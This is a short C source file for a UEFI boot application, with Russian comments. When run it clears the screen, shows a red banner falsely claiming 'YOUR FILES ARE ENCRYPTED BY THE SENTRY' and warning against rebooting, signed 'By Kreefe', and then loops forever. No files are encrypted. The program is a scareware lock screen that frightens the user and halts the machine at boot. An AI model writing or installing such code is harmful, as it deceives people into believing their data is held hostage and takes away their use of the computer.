#include <efi.h>
#include <efilib.h>

EFI_STATUS
EFIAPI
efi_main (EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    InitializeLib(ImageHandle, SystemTable);

    // Очищаем экран
    SystemTable->ConOut->ClearScreen(SystemTable->ConOut);

    // Ставим КРАСНЫЙ фон (0x4) и белый текст (0xF)
    SystemTable->ConOut->SetAttribute(SystemTable->ConOut, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));

    // Твой текст
    Print(L"\n\n");
    Print(L"  ####################################################\n");
    Print(L"  #                                                  #\n");
    Print(L"  #  FATAL ERROR: SYSTEM HALTED                      #\n");
    Print(L"  #  YOUR FILES ARE ENCRYPTED BY THE SENTRY.         #\n");
    Print(L"  #  DO NOT REBOOT OR YOU WILL LOSE EVERYTHING!      #\n");
    Print(L"  #                                                  #\n");
    Print(L"  #                                                  #\n");
    Print(L"  #     By Kreefe By Kreefe By Kreefe By Kreefe      #\n");
    Print(L"  #                                                  #\n");
    Print(L"  #                                                  #\n");
    Print(L"  ####################################################\n");

    // Зацикливаем
    while(1) {
    }

    return EFI_SUCCESS;
}
